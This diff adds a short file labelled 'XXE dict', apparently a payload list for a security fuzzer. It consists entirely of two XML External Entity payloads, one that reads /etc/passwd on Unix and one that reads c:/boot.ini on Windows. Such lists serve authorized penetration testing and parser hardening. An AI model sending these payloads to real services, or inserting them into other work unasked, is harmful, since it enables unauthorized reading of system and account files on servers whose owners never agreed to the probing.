@@ -1,0 +1,7 @@
+# XXE dict
+
+# for Unix
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+
+# for Windows
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///c:/boot.ini"> ]>
